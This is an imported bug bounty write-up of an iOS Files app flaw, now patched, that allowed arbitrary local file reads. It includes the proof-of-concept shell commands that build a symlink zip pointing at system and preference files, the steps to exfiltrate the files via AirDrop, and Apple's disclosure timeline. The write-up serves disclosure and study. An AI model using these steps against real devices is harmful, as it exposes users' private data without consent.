---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-11-17_write-up-apple-na-pii-information-full-contact-list-main-phone-no-and-main-iclou.md
original_filename: 2021-11-17_write-up-apple-na-pii-information-full-contact-list-main-phone-no-and-main-iclou.md
title: 'Write Up – Apple N/A: PII Information, Full Contact List, Main Phone No. And
  Main Icloud Email Extracted; Bug Patched: Arbitrary Local File Read Via Zip File
  And Symlinks On Ios Files App.'
category: documents
detected_topics:
- xss
- command-injection
- mobile-security
- supply-chain
tags:
- imported
- documents
- xss
- command-injection
- mobile-security
- supply-chain
language: en
raw_sha256: a8dcde0112da732c530778c1b0ded625160324c3973c39659f3369d66e33f857
text_sha256: 55dc1dd1f0a08c46eff3c364ada8f27ae5beeb16d5d14be31adfcab1a9ee6cf7
ingested_at: '2026-06-28T07:32:08Z'
sensitivity: unknown
redactions_applied: true
---

# Write Up – Apple N/A: PII Information, Full Contact List, Main Phone No. And Main Icloud Email Extracted; Bug Patched: Arbitrary Local File Read Via Zip File And Symlinks On Ios Files App.

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-11-17_write-up-apple-na-pii-information-full-contact-list-main-phone-no-and-main-iclou.md
- Source Type: markdown
- Detected Topics: xss, command-injection, mobile-security, supply-chain
- Ingested At: 2026-06-28T07:32:08Z
- Redactions Applied: True
- Raw SHA256: `a8dcde0112da732c530778c1b0ded625160324c3973c39659f3369d66e33f857`
- Text SHA256: `55dc1dd1f0a08c46eff3c364ada8f27ae5beeb16d5d14be31adfcab1a9ee6cf7`


## Content

---
title: "Write Up – Apple N/A: PII Information, Full Contact List, Main Phone No. And Main Icloud Email Extracted; Bug Patched: Arbitrary Local File Read Via Zip File And Symlinks On Ios Files App."
page_title: "APPLE N/A – ARBITRARY LOCAL FILE READ VIA ZIP FILE AND SYMLINKS ON IOS FILES APP – @omespino"
url: "https://omespino.com/write-up-apple-bug-bounty-n-a-arbitrary-local-file-read-via-zip-file-and-symlinks-usd/"
final_url: "https://omespino.com/write-up-apple-bug-bounty-n-a-arbitrary-local-file-read-via-zip-file-and-symlinks-usd/"
authors: ["Omar Espino (@omespino)"]
programs: ["Apple"]
bugs: ["Arbitrary file read"]
publication_date: "2021-11-17"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3161
---

MOBILEN/A[November 2021](/write-up-apple-bug-bounty-n-a-arbitrary-local-file-read-via-zip-file-and-symlinks-usd/)

# APPLE N/A – ARBITRARY LOCAL FILE READ VIA ZIP FILE AND SYMLINKS ON IOS FILES APP

**Introduction** Hi everyone It’s been a while since my last post but I’m back, I want to tell you a very short story about one of my last bugs, and how I managed to get an Arbitrary local file read on iOS Files app via zip file and symlinks

Disclaimer: Unfortunately, after 13 months of waiting and the bug patched, Apple didn’t consider this as security issue and it wasn’t rewarded. 

**Extracted from Apple Bug Bounty report: (the actual Apple Bug Bount report):**

**Title** Arbitrary local file read via zip file and symlinks  

1.- Prepare the zip file in the Macbook (or any unix* like computer):
  
  
  # Make a new directory called symlinks 
  mkdir symlinks; cd symlinks
  # Make a new directory called symlinks 
  mkdir symlinks; cd symlinks
  # Go to the directory and create the following symlinks
  ln -sf /private/etc/group etc_group.txt
  ln -sf /private/etc/hosts etc_hosts.txt
  ln -sf /private/var/mobile/Library/Preferences/com.apple.identityservices.idstatuscache.plist identityservices.idstatuscache.plist.txt
  ln -sf /private/var/mobile/Library/Preferences/com.apple.commcenter.shared.plist commcenter.shared.plist.txt 
  ln -sf /private/var/mobile/Library/Preferences/com.apple.sharingd.plist sharingd.plist.txt 
  # Then inside of symlinks' directory create the special zip file that allows symlinks 
  zip --symlinks -r symlinks.zip .
  # After that share the file with your iOS device 
  # In this case, I shared the file via Airdrop
  

2.- On Iphone’s  
– Go to the File app > Downloads and click the symlinks.zip file  
– then navigate inside to the symlinks folder  
– choose any file and send it back to the Macbook via iDrop 3.- On Macbook, receive the file, append .txt in the filename, open it, and profit!  
PS. zip file attached with video and the symlinks.zip file password=***REDACTED***

  
Enviroment:  
– iPhone 8 – iOS version 14.0.1  
– Files iOS app lastest version  
– Macbook pro macOS catalina version 10.15.6  
– My personal devices and personal iCloud account

  
Is this bug public or known by third parties?​: No​  
Can I reproduce this issue every time? Yes  
How did I find this bug? Manually / Other

**Report Timeline**

Oct 14, 2020: Sent the report to Apple  
Oct 18, 2020: Automated response from Apple: “Because of the potentially sensitive nature of security issues, we ask that this information remains between you and Apple while we investigate it further.”  
Jan 18, 2021: I sent a message to follow up, asking for any update on this issue  
Jan 21, 2021: Got a message from Apple “We are still investigating and have no new status updates to share at this time.”  
Apr 07, 2021: I sent another message to follow up, asking for any update on this issue  
Apr 07, 2021: Got a message from Apple “We are planning to address this issue in an upcoming security update in the summer of 2021. To avoid placing our customers at risk, we would appreciate you not disclosing this information until the necessary updates are available.”  
Jul 27, 2021: I sent another message to follow up, asking for any update on this issue  
Jul 28, 2021: Got a message from Apple “This issue was addressed with the release of iOS 14.5. REDACTED, REDACTED, REDACTED, we want to publicly acknowledge your assistance on our security advisory.”  
Jul 28, 2021: I sent a Thank you mesage asking for any reward Bug Bounty decision and permission to disclose this bug.  
Sep 07, 2021: Got a message from Apple “Thank you for letting us know of your plans publish your report. Due to a process issue, your credit information was not published to our advisories. We will credit you as “Omar Espino (omespino.com)” in a future update to our advisories.”  
Sep 07, 2021: I another message asking for any reward Bug Bounty decision.  
Oct 07, 2021: Got a message from Apple “We do not have any update yet. We should have an update at the beginning of next month.”  
Nov 11, 2021: I another message asking for any reward Bug Bounty decision.  
Nov 17, 2021: Got a message from Apple “This issue has been reviewed for the Apple Security Bounty and, unfortunately, it does not qualify. This is because the reported issue and your proof-of-concept do not demonstrate the categories listed on https://developer.apple.com/security-bounty/payouts/.”

****

Well that’s it, share your thoughts, what do you think about how they handle that security issue? If you have any doubt, comments or suggestions just drop me a line here or on Twitter [@omespino](https://twitter.com/omespino), read you later.

[](/write-up-xss-stored-in-files-slack-com-via-xml-svg-file-ios-1000-usd/)

[](/write-up-google-vrp-bug-bounty-etc-environment-local-variables-exfiltrated-on-linux-google-earth-pro-desktop-app-1337-usd/)
